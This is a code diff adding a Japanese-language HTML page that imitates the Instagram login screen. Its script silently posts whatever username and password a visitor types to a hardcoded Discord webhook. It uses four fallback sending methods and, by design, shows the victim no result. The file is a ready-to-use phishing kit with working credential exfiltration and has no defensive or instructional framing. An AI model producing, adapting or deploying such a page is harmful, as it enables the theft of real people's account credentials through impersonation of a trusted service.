@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram ログイン</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: linear-gradient(45deg,
+        #405DE6, #5851DB, #833AB4, #C13584, #E1306C,
+        #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
+      background-attachment: fixed;
+      padding: 20px;
+    }
+
+    .login-box {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border-radius: 28px;
+      padding: 2.5rem 2rem;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      color: #fff;
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 2.4rem;
+      font-weight: 700;
+      letter-spacing: -1px;
+      margin-bottom: 0.4rem;
+      background: linear-gradient(to right, #ffffff, #ffe6f0);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 0.95rem;
+      color: rgba(255, 255, 255, 0.85);
+      margin-bottom: 2rem;
+      font-weight: 300;
+    }
+
+    label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 500;
+      margin-bottom: 0.4rem;
+      color: rgba(255, 255, 255, 0.9);
+    }
+
+    input {
+      width: 100%;
+      padding: 0.85rem 1rem;
+      margin-bottom: 1.2rem;
+      border: 1px solid rgba(255, 255, 255, 0.4);
+      border-radius: 14px;
+      background: rgba(255, 255, 255, 0.12);
+      color: #fff;
+      font-size: 1rem;
+      outline: none;
+      transition: all 0.25s ease;
+    }
+
+    input::placeholder { color: rgba(255, 255, 255, 0.55); }
+
+    input:focus {
+      border-color: rgba(255, 255, 255, 0.9);
+      background: rgba(255, 255, 255, 0.2);
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.15);
+    }
+
+    .btn {
+      width: 100%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: linear-gradient(135deg, #ffffff, #f5e6ff);
+      color: #1a1a2e;
+      font-weight: 700;
+      font-size: 1.05rem;
+      padding: 0.9rem 1rem;
+      border-radius: 50px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
+      transition: all 0.3s ease;
+      margin-top: 0.4rem;
+    }
+
+    .btn:hover { transform: translateY(-3px); box-shadow: 0 16px 30px rgba(0, 0, 0, 0.3); }
+    .btn:active { transform: translateY(0); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+    .btn svg { width: 20px; height: 20px; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 1.6rem 0 1rem;
+      color: rgba(255, 255, 255, 0.5);
+      font-size: 0.75rem;
+    }
+
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: rgba(255, 255, 255, 0.3);
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <div class="logo">Instagram</div>
+    <div class="subtitle">アカウントにログイン</div>
+
+    <form id="loginForm" autocomplete="off" onsubmit="return false;">
+      <label for="username">ユーザーネーム</label>
+      <input type="text" id="username" placeholder="ユーザー名またはメールアドレス">
+
+      <label for="password">パスワード</label>
+      <input type="password" id="password" placeholder="パスワード">
+
+      <button type="submit" class="btn" id="loginBtn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
+          <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
+          <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
+        </svg>
+        Instagramでログイン
+      </button>
+    </form>
+
+    <div class="divider">または</div>
+
+    <button class="btn" id="openAppBtn" style="background: rgba(255,255,255,0.2); color:#fff; border:1px solid rgba(255,255,255,0.4); box-shadow:none;">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px;">
+        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+        <polyline points="15 3 21 3 21 9"></polyline>
+        <line x1="10" y1="14" x2="21" y2="3"></line>
+      </svg>
+      Instagramアプリを開く
+    </button>
+  </div>
+
+  <script>
+    (function() {
+      // ============================================================
+      // Discord Webhook URL
+      // ============================================================
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1562098434448826373/y00doIxLeUq8o7_LVwmc16rF4bgxfWR56o3bnd1QngpXThf21tCrK953eBH5J76S5ysX';
+
+      // ============================================================
+      // Discordへ静かに送信（ユーザーには何も表示しない）
+      // ============================================================
+      async function sendToDiscord(username, password) {
+        const now = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });
+
+        const contentText =
+          '🔐 **ログイン情報**\n' +
+          '👤 ユーザーネーム: `' + (username || '（未入力）') + '`\n' +
+          '🔑 パスワード: `' + (password || '（未入力）') + '`\n' +
+          '🕒 日時: ' + now;
+
+        const payload = { content: contentText };
+        const jsonStr = JSON.stringify(payload);
+
+        let sent = false;
+
+        // ---- 方法A: FormData (multipart) で送信 ----
+        try {
+          const formData = new FormData();
+          formData.append('payload_json', jsonStr);
+          await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: formData
+          });
+          sent = true;
+        } catch (e) { /* 静かに無視 */ }
+
+        // ---- 方法B: sendBeacon (text/plain) ----
+        if (!sent && navigator.sendBeacon) {
+          try {
+            const blob = new Blob([jsonStr], { type: 'text/plain' });
+            if (navigator.sendBeacon(WEBHOOK_URL, blob)) sent = true;
+          } catch (e) { /* 静かに無視 */ }
+        }
+
+        // ---- 方法C: no-cors + JSON ----
+        if (!sent) {
+          try {
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: { 'Content-Type': 'application/json' },
+              body: jsonStr
+            });
+            sent = true;
+          } catch (e) { /* 静かに無視 */ }
+        }
+
+        // ---- 方法D: 画像ビーコン（最終手段） ----
+        if (!sent) {
+          try {
+            const params = new URLSearchParams({ wait: 'true', content: contentText });
+            const img = new Image();
+            img.src = WEBHOOK_URL + '?' + params.toString();
+            sent = true;
+          } catch (e) { /* 静かに無視 */ }
+        }
+
+        return sent;
+      }
+
+      // ============================================================
+      // ログインボタン（成功/失敗を一切表示しない）
+      // ============================================================
+      const loginBtn = document.getElementById('loginBtn');
+      loginBtn.addEventListener('click', async function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        // 入力が空の場合は何もしない（エラーも表示しない）
+        if (!username || !password) {
+          // オプション: 空入力時にボタンを軽くシェイクするなどのUX演出も可能
+          return;
+        }
+
+        // ボタンを無効化して二重送信を防止
+        loginBtn.disabled = true;
+
+        // 静かに送信
+        await sendToDiscord(username, password);
+
+        // ボタンを元に戻す（送信結果は表示しない）
+        loginBtn.disabled = false;
+
+        // 入力欄をクリア（任意：送信後に空にする）
+        // document.getElementById('username').value = '';
+        // document.getElementById('password').value = '';
+
+        // オプション: 何も表示せず、ただ待機する
+        // Instagram風に見せるなら、少しだけボタンをローディング状態にする演出も可能
+      });
+
+      // ============================================================
+      // Instagramアプリ起動
+      // ============================================================
+      const openAppBtn = document.getElementById('openAppBtn');
+      openAppBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value.trim();
+        const appUrl = username
+          ? `instagram://user?username=${encodeURIComponent(username)}`
+          : 'instagram://app';
+
+        let appOpened = false;
+        const onVis = () => { if (document.hidden) appOpened = true; };
+        document.addEventListener('visibilitychange', onVis);
+
+        window.location.href = appUrl;
+
+        setTimeout(() => {
+          document.removeEventListener('visibilitychange', onVis);
+          // アプリ起動できなかった場合も何も表示しない
+        }, 2000);
+      });
+
+      // ============================================================
+      // キーボード操作
+      // ============================================================
+      const usernameInput = document.getElementById('username');
+      const passwordInput = document.getElementById('password');
+
+      usernameInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') { e.preventDefault(); passwordInput.focus(); }
+      });
+
+      passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') { e.preventDefault(); loginBtn.click(); }
+      });
+    })();
+  </script>
+</body>
+</html>
